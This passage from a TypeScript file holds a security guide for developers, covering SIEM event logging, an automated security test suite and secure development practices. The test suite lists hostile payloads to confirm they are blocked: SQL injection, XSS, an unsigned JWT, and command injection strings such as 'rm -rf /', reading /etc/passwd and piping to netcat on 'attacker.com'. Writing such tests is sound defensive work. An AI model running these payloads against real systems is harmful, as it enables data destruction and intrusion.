    const mediumSeverityEvents = [
      'FAILED_LOGIN',
      'ACCOUNT_LOCKED',
      'SUSPICIOUS_ACTIVITY',
      'UNAUTHORIZED_ACCESS_ATTEMPT'
    ];

    if (highSeverityEvents.includes(event.type)) return 'HIGH';
    if (mediumSeverityEvents.includes(event.type)) return 'MEDIUM';
    return 'LOW';
  }

  private checkAlertThresholds(event: SecurityEvent): void {
    const alertConfig = this.alertThresholds.get(event.type);
    if (!alertConfig) return;

    // Implementation would check event frequency and trigger alerts
    // This would typically involve storing event counts in Redis or similar
  }

  private async sendToSIEM(logEntry: any): Promise<void> {
    if (process.env.SIEM_ENDPOINT) {
      try {
        // Send to SIEM system (Splunk, ELK, etc.)
        await fetch(process.env.SIEM_ENDPOINT, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': \`Bearer \${process.env.SIEM_API_KEY}\`
          },
          body: JSON.stringify(logEntry)
        });
      } catch (error) {
        this.logger.error('Failed to send to SIEM', { error: error.message });
      }
    }
  }
}

interface SecurityEvent {
  type: string;
  userId?: string;
  ipAddress?: string;
  userAgent?: string;
  resource?: string;
  action?: string;
  details?: any;
  riskScore?: number;
}

interface AlertConfig {
  count: number;
  timeWindow: number;
  severity: Severity;
}

type Severity = 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
\`\`\`

## Security Testing

### Automated Security Testing
\`\`\`typescript
// tests/security/security-test-suite.ts
import { SecurityTestRunner } from './security-test-runner';

describe('Security Test Suite', () => {
  const testRunner = new SecurityTestRunner();

  describe('Authentication Security', () => {
    test('should prevent brute force attacks', async () => {
      const result = await testRunner.testBruteForceProtection();
      expect(result.protected).toBe(true);
      expect(result.lockoutTriggered).toBe(true);
    });

    test('should enforce strong password policy', async () => {
      const weakPasswords = ['123456', 'password', 'qwerty'];
      for (const password of weakPasswords) {
        const result = await testRunner.testPasswordStrength(password);
        expect(result.accepted).toBe(false);
      }
    });

    test('should validate JWT tokens properly', async () => {
      const maliciousTokens = [
        'eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.',
        'invalid.token.here',
        '' // empty token
      ];

      for (const token of maliciousTokens) {
        const result = await testRunner.testJWTValidation(token);
        expect(result.valid).toBe(false);
      }
    });
  });

  describe('Input Validation Security', () => {
    test('should prevent SQL injection', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1' UNION SELECT * FROM passwords --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const result = await testRunner.testSQLInjection(payload);
        expect(result.blocked).toBe(true);
      }
    });

    test('should prevent XSS attacks', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(1)">'
      ];

      for (const payload of xssPayloads) {
        const result = await testRunner.testXSSPrevention(payload);
        expect(result.sanitized).not.toContain('<script>');
        expect(result.sanitized).not.toContain('javascript:');
      }
    });

    test('should prevent command injection', async () => {
      const commandInjectionPayloads = [
        '; cat /etc/passwd',
        '&& rm -rf /',
        '| nc attacker.com 4444'
      ];

      for (const payload of commandInjectionPayloads) {
        const result = await testRunner.testCommandInjection(payload);
        expect(result.blocked).toBe(true);
      }
    });
  });

  describe('Authorization Security', () => {
    test('should enforce proper access controls', async () => {
      const testCases = [
        { userId: 'user1', resource: '/admin', expectedAccess: false },
        { userId: 'admin1', resource: '/admin', expectedAccess: true },
        { userId: 'user1', resource: '/user/profile', expectedAccess: true }
      ];

      for (const testCase of testCases) {
        const result = await testRunner.testAccessControl(
          testCase.userId, 
          testCase.resource
        );
        expect(result.accessGranted).toBe(testCase.expectedAccess);
      }
    });

    test('should prevent privilege escalation', async () => {
      const result = await testRunner.testPrivilegeEscalation();
      expect(result.escalationPrevented).toBe(true);
    });
  });

  describe('Session Security', () => {
    test('should implement secure session management', async () => {
      const result = await testRunner.testSessionSecurity();
      expect(result.sessionTimeout).toBe(true);
      expect(result.sessionRotation).toBe(true);
      expect(result.secureFlags).toBe(true);
    });

    test('should prevent session fixation', async () => {
      const result = await testRunner.testSessionFixation();
      expect(result.sessionRegeneratedOnLogin).toBe(true);
    });
  });

  describe('Data Protection', () => {
    test('should encrypt sensitive data', async () => {
      const sensitiveData = 'personal-information';
      const result = await testRunner.testDataEncryption(sensitiveData);
      expect(result.encrypted).toBe(true);
      expect(result.decryptedCorrectly).toBe(true);
    });

    test('should implement proper key management', async () => {
      const result = await testRunner.testKeyManagement();
      expect(result.keyRotation).toBe(true);
      expect(result.keyStorage).toBe(true);
    });
  });
});
\`\`\`

## Best Practices and Guidelines

### Secure Development Lifecycle
1. **Threat Modeling**: Identify and analyze potential threats early in development
2. **Security Requirements**: Define security requirements alongside functional requirements
3. **Secure Coding Standards**: Establish and enforce secure coding guidelines
4. **Security Testing**: Integrate security testing throughout the development process
5. **Security Reviews**: Conduct regular security code reviews and assessments
6. **Incident Response**: Prepare and test incident response procedures

### OWASP Security Controls
- **Authentication**: Multi-factor authentication, secure password policies
- **Session Management**: Secure session handling, timeout policies
- **Access Control**: Role-based access control, principle of least privilege
- **Input Validation**: Comprehensive input validation and sanitization
- **Output Encoding**: Proper output encoding to prevent XSS
- **Cryptography**: Strong encryption algorithms and key management
- **Error Handling**: Secure error handling without information disclosure
- **Logging**: Comprehensive security logging and monitoring

### Security Monitoring Strategy
- **Real-time Monitoring**: Monitor security events in real-time
- **Threat Intelligence**: Integrate threat intelligence feeds
- **Behavioral Analysis**: Detect anomalous user behavior
- **Vulnerability Management**: Regular vulnerability scanning and patching
- **Compliance Monitoring**: Ensure compliance with security standards

### Security Testing Approach
- **Static Analysis**: Automated code analysis for security vulnerabilities
- **Dynamic Analysis**: Runtime security testing of running applications
- **Interactive Testing**: Manual penetration testing and security assessments
- **Dependency Scanning**: Regular scanning of third-party dependencies
- **Infrastructure Testing**: Security testing of infrastructure components`,
    author: {
      name: 'Claude Code Community',
      url: 'https://github.com/claudecode-community'
    },
    lastUpdated: '2024-12-01'
  }
];